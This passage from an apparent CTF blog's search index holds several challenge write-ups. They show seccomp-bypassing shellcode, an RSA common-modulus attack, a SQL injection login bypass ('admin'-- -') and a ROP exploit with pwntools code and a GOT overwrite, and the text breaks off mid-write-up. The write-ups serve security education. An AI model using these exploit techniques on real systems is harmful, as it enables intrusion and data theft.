0009: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0013 0010: 0x20 0x00 0x00 0x00000010 A = fd # write(fd, buf, count) 0011: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0013 0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0013: 0x06 0x00 0x00 0x00000000 return KILL  Alright, so sys_exit, sys_exit_group and sys_write. In order to get the flag, the idea here is to iterate through all posible addresses and write their contents to stdout until we find the flag.\nSince PIE is enabled, we will need to perform a brute force attack on the variable flag address. We know that the last three hexadecimal digits won\u0026rsquo;t change (060):\n$ readelf -s chall | grep flag 74: 0000000000000bd0 141 FUNC GLOBAL DEFAULT 14 load_flag 75: 0000000000202060 64 OBJECT GLOBAL DEFAULT 24 flag  Final exploit So, this is the assembly code we are going to send:\nmov rsi, 0x550000002060 # Start searching from address mov rdi, 1 # stdout mov rdx, 100 # Length write: mov rax, 1 # $rax = 1 = sys_write syscall cmp rax, 0 # Error code je exit add rsi, 0x100000 # Increase address jmp write exit: xor rax, rax or rax, 0x3c # $rax = 0x3c = sys_exit xor rdi, rdi # $rdi = 0 = Error code syscall  From experience, I know that PIE binary addresses start with 0x55 or 0x56. We can view it in GDB:\n$ gdb -q chall Reading symbols from chall... (No debugging symbols found in chall) gef➤ aslr on [+] Enabling ASLR gef➤ start [+] Breaking at '0xa00'  gef➤ p \u0026flag $1 = (\u0026lt;data variable, no debug info\u0026gt; *) 0x561692002060 \u0026lt;flag\u0026gt; gef➤ run Starting program: ./chall Welcome to Shellcode as a Service! ^C Program received signal SIGINT, Interrupt. 0x00007f68d9afffd2 in __GI___libc_read (fd=0x0, buf=0x7f68d9c4c04b, nbytes=0x100) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory.  gef➤ p \u0026flag $2 = (\u0026lt;data variable, no debug info\u0026gt; *) 0x559b14002060 \u0026lt;flag\u0026gt;  Since we are looking for the flag variable, I will set 0x550000002060 as the starting address and increase in steps of 0x100000.\nFlag The exploit won\u0026rsquo;t be always successful because the server has a time-out set. But there will be a time when we will see the flag:\n$ python3 solve.py mars.picoctf.net 31021 [*] './chall' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/saas/","section":"ctf","summary":"picoMini by redpwn. 350 points. 64-bit binary. seccomp rules. Custom shellcode","time":4,"title":"SaaS"},{"contents":"We are given a Java source file called SafeOpener.java:\nimport java.io.*; import java.util.*; public class SafeOpener { public static void main(String args[]) throws IOException { BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in)); Base64.Encoder encoder = Base64.getEncoder(); String encodedkey = \"\"; String key = \"\"; int i = 0; boolean isOpen; while (i \u0026lt; 3) { System.out.print(\"Enter password for the safe: \"); key = keyboard.readLine(); encodedkey = encoder.encodeToString(key.getBytes()); System.out.println(encodedkey); isOpen = openSafe(encodedkey); if (!isOpen) { System.out.println(\"You have \" + (2 - i) + \" attempt(s) left\"); i++; continue; } break; } } public static boolean openSafe(String password) { String encodedkey = \"cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz\"; if (password.equals(encodedkey)) { System.out.println(\"Sesame open\"); return true; } else { System.out.println(\"Password is incorrect\\n\"); return false; } } }  Here we find a suspicious string:\nString encodedkey = \"cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz\";  It seems to be encoded in Base64. Let\u0026rsquo;s decode it:\n$ echo cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz | base64 -d pl3as3_l3t_m3_1nt0_th3_saf3  The flag is just: picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/reverse-engineering/safe-opener/","section":"ctf","summary":"picoCTF 2022. 100 points. Analyze Java code. Base64","time":1,"title":"Safe Opener"},{"contents":"We are given the source code in Python to encrypt the flag:\nfromCrypto.Util.numberimportgetPrime, bytes_to_long m=bytes_to_long(open(\"flag\", \"rb\").read()) n=getPrime(512)*getPrime(512) e=[1337,31337] print(n) print(pow(m,e[0],n)) print(pow(m,e[1],n))  And we have the output of the program:\n88627598925887227793409704066287679810103408445903546693879278352563489802835708613718629728355698762251810901364530308365201192197988674078034209878433048946797619290221501750862580914894979204943093716650072734138749420932619469204815802746273252727013183568196402223549961607284086898768583604510696483111 45254947860172381004009381991735702721210786277711531577381599020185600496787746985669891424940792336396574951744089759764874889285927022268694128526139687661305707984329995359802337446670063047702309778972385903473896687843125261988493615328641864610786785749566148338268077425756876069789788618208807001704 16054811947596452078263236160429328686151351092304509270058479526590947874445940946506791900760052230887962479603369427120610506778471930164144528718052332194666418267005043709704814833963217926271924910466448499814399455203725279998913865531351070938872586642424346857094632491904168889134624707595846754719  The cryptosystem is RSA, but there\u0026rsquo;s a vulnerability. The flag ($m$) is being encrypted two times as\n$$ c_1 = m ^ {e_1} \\pmod{n} $$\n$$ c_2 = m ^ {e_2} \\pmod{n} $$\nThe problem here is that the same message is raised to a different power but using the same modulus $n$.\nFrom Bezout\u0026rsquo;s identity, given non-zero integers $a, b$ there exist integers $u, v$ such that\n$$ u \\cdot a + v \\cdot b = \\gcd{(a, b)} $$\nSince $\\gcd{(e_1, e_2)} = 1$, we can find $u$ and $v$ such that\n$$ u \\cdot e_1 + v \\cdot e_2 = 1 $$\nThe idea is find those values to calculate the message $m$ in this way:\n$$ c_1^u \\cdot c_2^v = (m^{e_1})^u \\cdot (m^{e_2})^v = m^{u \\cdot e_1} \\cdot m^{v \\cdot e_2} = m^{u \\cdot e_1 + v \\cdot e_2} = m \\pmod{n} $$\nThe values $u, v$ can be calculated using the extended GCD (Extended Euclidean algorithm).\nSo this is the code used to get the flag:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; def extended_gcd(a, b): ... if a % b: ... u, v, d = extended_gcd(b, a % b) ... return v, (d - a * v) // b, d ... return 0, 1, b ... \u0026gt;\u0026gt;\u0026gt; e1, e2 = 1337, 31337 \u0026gt;\u0026gt;\u0026gt; n = 88627598925887227793409704066287679810103408445903546693879278352563489802835708613718629728355698762251810901364530308365201192197988674078034209878433048946797619290221501750862580914894979204943093716650072734138749420932619469204815802746273252727013183568196402223549961607284086898768583604510696483111 \u0026gt;\u0026gt;\u0026gt; c1 = 45254947860172381004009381991735702721210786277711531577381599020185600496787746985669891424940792336396574951744089759764874889285927022268694128526139687661305707984329995359802337446670063047702309778972385903473896687843125261988493615328641864610786785749566148338268077425756876069789788618208807001704 \u0026gt;\u0026gt;\u0026gt; c2 = 16054811947596452078263236160429328686151351092304509270058479526590947874445940946506791900760052230887962479603369427120610506778471930164144528718052332194666418267005043709704814833963217926271924910466448499814399455203725279998913865531351070938872586642424346857094632491904168889134624707595846754719 \u0026gt;\u0026gt;\u0026gt; u, v, _ = extended_gcd(e1, e2) \u0026gt;\u0026gt;\u0026gt; m = pow(c1, u, n) * pow(c2, v, n) % n \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'ictf{n3ver_r3use_m0dul1}\\n' \u0026gt;\u0026gt;\u0026gt; exit()  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/same/","section":"ctf","summary":"ImaginaryCTF 10/08/2022. 75 points. RSA. Common modulus attack","time":2,"title":"same"},{"contents":"We are provided with this webpage:\nIf we look into the HTML source code, we see /debug:\nAnd there we can find the source code of the web application:\nfromflaskimportFlask, request, render_template, Response, url_for, g fromsqlite3importdbapi2assqlite3 fromfunctoolsimportwraps app=Flask(__name__) defget_db(): db=getattr(g, '_database', None) ifdbisNone: db=g._database =sqlite3.connect(':memory:', isolation_level=None) db.row_factory=sqlite3.Row withapp.app_context(): db.cursor().execute('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT);') withapp.open_resource('schema.sql', mode='r') asf: db.cursor().executescript(f.read()) returndb @app.teardown_appcontext defclose_connection(exception): db=getattr(g, '_database', None) ifdbisnotNone: db.close() defquery_db(query, args=(), one=False): try: withapp.app_context(): cur=get_db().execute(query, args) rv=[dict((cur.description[idx][0], value) foridx, valueinenumerate(row)) forrowincur.fetchall()] return(rv[0] ifrvelseNone) ifoneelserv exceptExceptionase: returne returnNone @app.route('/', methods=['GET', 'POST']) deflogin(): ifrequest.method=='POST': q=\"select * from users where username = '%s' AND password = '%s';\"%(request.form.get('username', ''), request.form.get('password', '')) login=query_db(q, one=True) ifisinstance(login, Exception): error='%s: %s'%(login.__class__, login) returnrender_template('index.html', query=q, error=error, image=url_for('static', filename='images/dog.png')) ifloginisNone: returnrender_template('index.html', query=q, image=url_for('static', filename='images/dog.png')) iflogin.get('username', '') =='admin': returnrender_template('index.html', query=open('flag').read()) returnrender_template('index.html') @app.route('/debug') defdebug(): returnResponse(open(__file__).read(), mimetype='text/plain') if__name__=='__main__': app.run('0.0.0.0', port=1337)  It is running Flask, but the key point is this one:\nq=\"select * from users where username = '%s' AND password = '%s';\"%(request.form.get('username', ''), request.form.get('password', ''))  The above query is vulnerable to SQL injection because we can enter a single quote, escape from the quote context and enter more SQL commands. For instance, if we enter admin'-- -, the query will look like:\nselect*fromusers whereusername ='admin'-- -' AND password = '%s';  So, we will gain access as admin without knowing the password:\nAnd there we have the flag (HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/sanitize/","section":"ctf","summary":"SQL injection. Authentication bypass","time":2,"title":"sanitize"},{"contents":"We are given a 64-bit binary called scrambler:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  We also have the remote Glibc binary (libc.so_1.6), so we can use pwninit to patch the binary and use the provided library, so that the local and the remote exploits are equal:\n$ pwninit --libc libc.so_1.6 --bin scrambler --no-template bin: scrambler libc: libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.31-0ubuntu9.7_amd64.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.31-0ubuntu9.7_amd64.deb setting ./ld-2.31.so executable symlinking libc.so.6 -\u0026gt; libc.so_1.6 copying scrambler to scrambler_patched running patchelf on scrambler_patched  Although the binary is stripped:\n$ file scrambler scrambler: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1343b327e61aac49d34bc641ccd80457126ef56e, for GNU/Linux 3.2.0, stripped  The reverse engineering process is not hard. After loading the binary in Ghidra and renaming variables and functions, we get this main function:\nint main() { undefined4 uVar1; int iVar2; long in_FS_OFFSET; int option; undefined4 arg1; undefined4 arg2; undefined4 arg3; int i; undefined auStack40 [8]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setup(); seccomp_rules(); i = 0; while (true) { puts(\"1) Try scrambling\"); puts(\"2) Quit\"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\",\u0026amp;option); if (option != 1) break; if (i \u0026lt; 8) { puts(\"arg1 = \"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;arg1); puts(\"arg2 = \"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;arg2); puts(\"arg3 = \"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;arg3); uVar1 = arg3; iVar2 = return_random(arg1,arg2); auStack40[iVar2] = (char) uVar1; i++; } else { puts(\"Not allowed!\"); } } puts(\"Good bye!\"); if (canary != *(long *) (in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; }  The binary is protected with some seccomp rules. We can use seccomp-tools to see what system calls are we able to use:\n$ seccomp-tools dump ./scrambler line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0a 0xc000003e if (A != ARCH_X86_64) goto 0012 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A 0x40000000) goto 0005 0004: 0x15 0x00 0x07 0xffffffff if (A != 0xffffffff) goto 0012 0005: 0x15 0x05 0x00 0x00000000 if (A == read) goto 0011 0006: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0011 0007: 0x15 0x03 0x00 0x00000002 if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x0000000a if (A == mprotect) goto 0011 0009: 0x15 0x01 0x00 0x0000003c if (A == exit) goto 0011 0010: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x06 0x00 0x00 0x00000000 return KILL  So, we are only able to use open, read, write and mprotect. Hence, the objective of the challenge is to read the flag (which is at /home/ctf/flag.txt, also provided for the challenge), and not to spawn a shell.\nAnalyzing the main function, we see that we can enter three numbers (arg1, arg2 and arg3). Then, arg1 and arg2 will be passed to the function I renamed to return_random. The result of that function will be used an offset to a stack address and arg3 will be the value to be stored in (as a char). Maybe the assembly instruction is clearer (taken from the output of objdump):\n40150c: 88 54 05 e0 mov BYTE PTR [rbp+rax*1-0x20],dl  This is return_random:\nint return_random(int arg1, int arg2) { int iVar1; time_t tVar2; tVar2 = time((time_t *) 0x0); srand((uint) tVar2); iVar1 = rand(); return arg2 + iVar1 % arg1; }  It is taking a random value and doing some math operations with the arguments arg1 and arg2. We could think of using a Pseudo-Random Number Generator (PRNG) initialized at time(0) as above, so that we know the value of iVar2 and have more control on the returning value. However, we can get rid of the random value if we set arg1 = 1, because:\n$$ z = 0 \\pmod{1} \\quad, \\forall z \\in \\mathbb{Z} $$\nTherefore, if arg1 = 1, then return_random(arg1, arg2) = arg2, so we have full control on what return_random returns (maybe I should have changed the name of the function\u0026hellip; not so random).\nAt this point, we have achieved a \u0026ldquo;write-what-where\u0026rdquo; primitive, because we control arg3 (which will be stored in $dl, only 1 byte) and we control the returning value of return_address (which is the offset from $rbp - 0x20, placed in $rax).\nThere is yet another limitation in the main function, which is that program won\u0026rsquo;t allow us to \u0026ldquo;Try scrambling\u0026rdquo; any more when the counter reaches i = 8. To bypass this, we can make use of the \u0026ldquo;write-what-where\u0026rdquo; primitive and fix the value of the counter to be a negative value, so that we get almost unlimited \u0026ldquo;scrambling\u0026rdquo; attempts. This is the assembly instruction that increments the counter:\n401510: 83 45 dc 01 add DWORD PTR [rbp-0x24],0x1  We see that the counter is stored in $rbp - 0x24. The \u0026ldquo;write-what-where\u0026rdquo; is based in $rbp - 0x20, so the 4 bytes before (int values are sized 32 bits) we have the value of the counter. We can check it with GDB setting a breakpoint in that address:\n$ gdb -q scrambler_patched Reading symbols from scrambler_patched... (No debugging symbols found in scrambler_patched) gef➤ break *0x401510 Breakpoint 1 at 0x401510 gef➤ run Starting program: ./scrambler_patched 1) Try scrambling 2) Quit \u0026gt; 1 arg1 = \u0026gt; 1 arg2 = \u0026gt; -4 arg3 = \u0026gt; 100 Breakpoint 1, 0x0000000000401510 in ?? ()  gef➤ x/x $rbp-0x24 0x7fffffffe70c: 0x00000064 gef➤ x/d $rbp-0x24 0x7fffffffe70c: 100  There we have it. We overwrote the value of the counter to be 100 (0x64). In order to achieve a negative value, we need that the most significant bit is set to 1. In fact, the lower bound for int is $-2^{31}$, which is represented as 0x80000000 (more information here). So if we use -1 instead of -4 and we put 128 (0x80) instead of 100, we will get a large negative value, so we don\u0026rsquo;t have to worry any more about the number of attempts.\nJust for testing purposes:\ngef➤ run Starting program: ./scrambler_patched 1) Try scrambling 2) Quit \u0026gt; 1 arg1 = \u0026gt; 1 arg2 = \u0026gt; -1 arg3 = \u0026gt; 128 Breakpoint 1, 0x0000000000401510 in ?? ()  gef➤ x/x $rbp-0x24 0x7fffffffe70c: 0x80000000 gef➤ x/d $rbp-0x24 0x7fffffffe70c: -2147483648  Alright, now we can start thinking on what to do next for exploitation.\nSince the objective is to read the flag and we are limited by seccomp rules, these will be the instructions we need to execute to complete the challenge:\n open(\u0026quot;/home/ctf/flag.txt\u0026quot;, O_RDONLY) read(fd, buffer, length) puts(buffer)  Also, recall that NX is enabled, so we need to use ROP to execute arbitrary code. Since we have to enter \u0026quot;/home/ctf/flag.txt\u0026quot;, we need to find a gadget such as mov qword ptr [rax], rdi; ret, because we don\u0026rsquo;t have more ways to enter text in the program. The binary does not have this type of gadgets, but Glibc does. Therefore, the first step will be to leak an address inside Glibc so that we can bypass ASLR and use offsets to gadgets.\nAlright, let\u0026rsquo;s start writing the exploit. This is what we have for the moment:\n#!/usr/bin/env python3 from pwn import context, ELF, log, p64, remote, sys, u64 elf = ELF('scrambler_patched') glibc = ELF('libc.so_1.6', checksec=False) context.binary = elf def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], sys.argv[2] return remote(host, int(port)) def write_what_where(p, what: int, where: int): p.sendlineafter(b'\u0026gt; ', b'1') p.sendlineafter(b'arg1 = \\n\u0026gt; ', b'1') p.sendlineafter(b'arg2 = \\n\u0026gt; ', str(where).encode()) p.sendlineafter(b'arg3 = \\n\u0026gt; ', str(what).encode()) def main(): p = get_process() write_what_where(p, 0x80, -1) flag = b'/home/ctf/flag.txt' p.interactive() if __name__ == '__main__': main()  With this code, we have unlimited attempts to \u0026ldquo;scramble\u0026rdquo;. The function write_what_where implements the above explanation of the primitive.\nNow we need to figure out if we can modify the saved return address so that we control program execution when we exit the while loop (using the option 2).\nOne way of doing it is knowing that we are writing using $rbp - 0x20 as base address. Since it is a 64-bit binary, experience will tell us that the saved return address is in $rbp + 8, so we need to use 0x28 as offset to modify the return address.\nIf not having enough experience, we can use GDB to find the offset. These are the lines executed when using option 2:\n40152a: 48 8d 3d 18 0b 00 00 lea rdi,[rip+0xb18] # 402049 \u0026lt;rand@plt+0xec9\u0026gt; 401531: e8 ca fb ff ff call 401100 \u0026lt;puts@plt\u0026gt; 401536: 90 nop 401537: b8 00 00 00 00 mov eax,0x0 40153c: 48 8b 4d e8 mov rcx,QWORD PTR [rbp-0x18] 401540: 64 48 33 0c 25 28 00 xor rcx,QWORD PTR fs:0x28 401547: 00 00 401549: 74 05 je 401550 \u0026lt;rand@plt+0x3d0\u0026gt; 40154b: e8 d0 fb ff ff call 401120 \u0026lt;__stack_chk_fail@plt\u0026gt; 401550: 48 83 c4 48 add rsp,0x48 401554: 5b pop rbx 401555: 5d pop rbp 401556: c3 ret  We can set a breakpoint at 0x401555 (right before pop rbp is executed) to check the return address and $rbp:\n$ gdb -q scrambler_patched Reading symbols from scrambler_patched... (No debugging symbols found in scrambler_patched) gef➤ break *0x401555 Breakpoint 1 at 0x401555 gef➤ run Starting program: ./scrambler_patched 1) Try scrambling 2) Quit \u0026gt; 2 Good bye! Breakpoint 1, 0x0000000000401555 in ?? ()  gef➤ p/x $rbp $1 = 0x7fffffffe730 gef➤ x/10gx $rsp 0x7fffffffe730: 0x0000000000000000 0x00007ffff7dc40b3 0x7fffffffe740: 0x00007ffff7ffc620 0x00007fffffffe828 0x7fffffffe750: 0x0000000100000000 0x00000000004013c2 0x7fffffffe760: 0x0000000000401560 0x2f62a629e826bd42 0x7fffffffe770: 0x0000000000401190 0x00007fffffffe820  So the return address is 0x00007ffff7dc40b3 (from __libc_start_main), which is at 0x7fffffffe738 ($rbp + 8, as expected).\nNotice that $rbp will be set to 0. This will be a problem and it took me a lot of time to find a solution.\nLet\u0026rsquo;s continue for the moment. Now we know where to write so that we modify the return address, so we can start creating a simple ROP chain to leak an address inside Glibc.\nI won\u0026rsquo;t be explaining the concepts behind this technique. If you need more information, read other challenges such as ropme or Here\u0026rsquo;s a LIBC for a detailed explanation. The main idea is to call puts using the PLT using the address of puts at the GOT as first argument (which will go in $rdi), so that puts prints the contents of that GOT address, which will be the real address of puts inside Glibc at runtime.\nWe can get the gadget pop rdi; ret with ROPgadget:\n$ ROPgadget --binary scrambler | grep ': pop rdi ; ret$' 0x00000000004015c3 : pop rdi ; ret  Nice, so this is the main function of the exploit:\ndef main(): p = get_process() pop_rdi_ret = 0x4015c3 while_addr = 0x401400 payload = p64(pop_rdi_ret) payload += p64(elf.got.puts) payload += p64(elf.plt.puts) payload += p64(while_addr) write_what_where(p, 0x80, -1) for i, b in enumerate(payload): write_what_where(p, b, 0x20 + 8 + i) p.sendlineafter(b'\u0026gt; ', b'2') p.recvline() puts_addr = u64(p.recvline().strip().ljust(8, b'\\0')) log.info(f'Leaked puts() address: {hex(puts_addr)}') p.interactive()  And if we run the exploit, we get the leaked address:\n$ python3 solve.py [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './scrambler_patched': pid 350738 [*] Leaked puts() address: 0x7f80e640d450 [*] Switching to interactive mode 1) Try scrambling 2) Quit [*] Got EOF while reading in interactive $  Also notice that we used 0x401400 as the next address to return, which is the start of the while loop. We can\u0026rsquo;t call the main function again because seccomp rules are already applied, and there is some setup for setvbuf, which is not allowed.\nLet\u0026rsquo;s compute the base address of Glibc:\nglibc.address = puts_addr - glibc.sym.puts log.info(f'Glibc base address: {hex(glibc.address)}')  Now we have the base address, which looks correct because it ends in 000 in hexadecimal:\n$ python3 solve.py [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './scrambler_patched': pid 353240 [*] Leaked puts() address: 0x7f4119ab8450 [*] Glibc base address: 0x7f4119a34000 [*] Switching to interactive mode 1) Try scrambling 2) Quit [*] Got EOF while reading in interactive $  Perfect. But we have a problem. We got \u0026ldquo;EOF while reading in interactive\u0026rdquo;, so the program crashed. And this is all because $rbp is set to 0 when returning from main. And since we cannot call main from the start, we cannot set again $rbp to its initial value.\nWhen I did the challenge I did not take this into account and started thinking on the next ROP chain to execute so that we can read the flag. But then I realized that I needed to solve the $rbp problem first.\nWe need to do something with $rbp, and we only have the binary (since Glibc is not leaked when crafting the first ROP chain). The aim is to redirect program execution to the while loop, but with a valid $rbp value (and not 0). The only thing we can do is search for gadgets that involve $rbp:\n$ ROPgadget --binary scrambler | grep ret$ | grep rbp 0x000000000040125a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x000000000040125b : add byte ptr [rcx], al ; pop rbp ; ret 0x0000000000401259 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x000000000040125c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x0000000000401257 : add eax, 0x2e4b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x00000000004013b8 : add eax, edx ; mov dword ptr [rbp - 4], eax ; mov eax, dword ptr [rbp - 4] ; leave ; ret 0x0000000000401551 : add esp, 0x48 ; pop rbx ; pop rbp ; ret 0x0000000000401550 : add rsp, 0x48 ; pop rbx ; pop rbp ; ret 0x00000000004013bc : cld ; mov eax, dword ptr [rbp - 4] ; leave ; ret 0x0000000000401256 : mov byte ptr [rip + 0x2e4b], 1 ; pop rbp ; ret 0x00000000004013ba : mov dword ptr [rbp - 4], eax ; mov eax, dword ptr [rbp - 4] ; leave ; ret 0x00000000004013bd : mov eax, dword ptr [rbp - 4] ; leave ; ret 0x00000000004012d8 : nop ; pop rbp ; ret 0x00000000004015bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004015bf : pop rbp ; pop r14 ; pop r15 ; ret 0x000000000040125d : pop rbp ; ret 0x0000000000401554 : pop rbx ; pop rbp ; ret  There is one gadget we can use to control $rbp, and it is pop rbp; ret. It would be great if we had a stack address to put it in $rbp, but we can\u0026rsquo;t leak any stack addresses on the first ROP chain and use them to control $rbp.\nTherefore, I tried using an address within the binary:\ngef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x000000003ff000 0x00000000400000 0x00000000000000 rw- ./scrambler_patched 0x00000000400000 0x00000000401000 0x00000000001000 r-- ./scrambler_patched 0x00000000401000 0x00000000402000 0x00000000002000 r-x ./scrambler_patched 0x00000000402000 0x00000000403000 0x00000000003000 r-- ./scrambler_patched 0x00000000403000 0x00000000404000 0x00000000003000 r-- ./scrambler_patched 0x00000000404000 0x00000000405000 0x00000000004000 rw- ./scrambler_patched 0x007ffff7d9d000 0x007ffff7da0000 0x00000000000000 rw- 0x007ffff7da0000 0x007ffff7dc2000 0x00000000000000 r-- ./libc.so_1.6 0x007ffff7dc2000 0x007ffff7f3a000 0x00000000022000 r-x ./libc.so_1.6 0x007ffff7f3a000 0x007ffff7f88000 0x0000000019a000 r-- ./libc.so_1.6 0x007ffff7f88000 0x007ffff7f8c000 0x000000001e7000 r-- ./libc.so_1.6 0x007ffff7f8c000 0x007ffff7f8e000 0x000000001eb000 rw- ./libc.so_1.6 0x007ffff7f8e000 0x007ffff7f92000 0x00000000000000 rw- 0x007ffff7f92000 0x007ffff7f94000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7f94000 0x007ffff7fa3000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fa3000 0x007ffff7fb1000 0x00000000011000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fb1000 0x007ffff7fb2000 0x0000000001f000 --- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fb2000 0x007ffff7fb3000 0x0000000001f000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fb3000 0x007ffff7fb4000 0x00000000020000 rw- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fb4000 0x007ffff7fb6000 0x00000000000000 rw- 0x007ffff7fc9000 0x007ffff7fcd000 0x00000000000000 r-- [vvar] 0x007ffff7fcd000 0x007ffff7fcf000 0x00000000000000 r-x [vdso] 0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- ./ld-2.31.so 0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x ./ld-2.31.so 0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- ./ld-2.31.so 0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- ./ld-2.31.so 0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- ./ld-2.31.so 0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw- 0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]  We need an address that has rw- permissions, so 0x404000 is a good choice. Since the binary has no PIE protection, this address is fix. Nevertheless, I used 0x404200 because the GOT is placed in 0x404000, and I don\u0026rsquo;t want to break it.\nSo we must update the ROP chain:\npop_rdi_ret = 0x4015c3 pop_rbp_ret = 0x40125d new_rbp = 0x404200 while_addr = 0x401400 payload = p64(pop_rdi_ret + 1) payload += p64(pop_rdi_ret) payload += p64(elf.got.puts) payload += p64(elf.plt.puts) payload += p64(pop_rbp_ret) payload += p64(new_rbp) payload += p64(while_addr)  Notice the pop_rdi_ret + 1 (a ret gadget) is needed to avoid stack alignment issues in printf. We have an interactive process:\n$ python3 solve.py [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './scrambler_patched': pid 363454 [*] Leaked puts() address: 0x7f5d037c6450 [*] Glibc base address: 0x7f5d03742000 [*] Switching to interactive mode 1) Try scrambling 2) Quit \u0026gt; $ 1 arg1 = \u0026gt; $ 1 arg2 = \u0026gt; $ 1 arg3 = \u0026gt; $ 1 1) Try scrambling 2) Quit \u0026gt; $ 2 Good bye! [*] Got EOF while reading in interactive  However, we have another problem, related with the canary protection:\n40153c: 48 8b 4d e8 mov rcx,QWORD PTR [rbp-0x18] 401540: 64 48 33 0c 25 28 00 xor rcx,QWORD PTR fs:0x28 401547: 00 00 401549: 74 05 je 401550 \u0026lt;rand@plt+0x3d0\u0026gt; 40154b: e8 d0 fb ff ff call 401120 \u0026lt;__stack_chk_fail@plt\u0026gt; 401550: 48 83 c4 48 add rsp,0x48 401554: 5b pop rbx 401555: 5d pop rbp 401556: c3 ret 401557: 66 0f 1f 84 00 00 00 nop WORD PTR [rax+rax*1+0x0]  The program is taking the saved canary using and offset to $rbp. Since we modified $rbp, obviously the value at the offset won\u0026rsquo;t be equal to the master canary (fs:0x28). And therefore, the program will exit immediately (__stack_chk_fail).\nThis problem comes when using option 2 to execute the second ROP chain (that will print out the flag). Since we have a \u0026ldquo;write-what-where\u0026rdquo; and $rbp has an address within the binary, we can calculate an offset to the GOT (notice there is Partial RELRO, which allows to modify the GOT at runtime).\nThe GOT is a table that holds the real addresses of external functions or pointers to a resolution table if the function has not been used. The objective is to modify the value of the entry for __stack_chk_fail, so that even if the saved canary does not match with the master canary, the program won\u0026rsquo;t exit because __stack_chk_fail will not be resolved to the real __stack_chk_fail.\nWe can visualize the GOT in GDB:\n$ gdb -q scrambler_patched Reading symbols from scrambler_patched... (No debugging symbols found in scrambler_patched) gef➤ start [+] Breaking at entry-point: 0x401190  gef➤ got GOT protection: Partial RelRO | GOT functions: 11 [0x404018] seccomp_init → 0x401030 [0x404020] seccomp_rule_add → 0x401040 [0x404028] puts@GLIBC_2.2.5 → 0x401050 [0x404030] seccomp_load → 0x401060 [0x404038] __stack_chk_fail@GLIBC_2.4 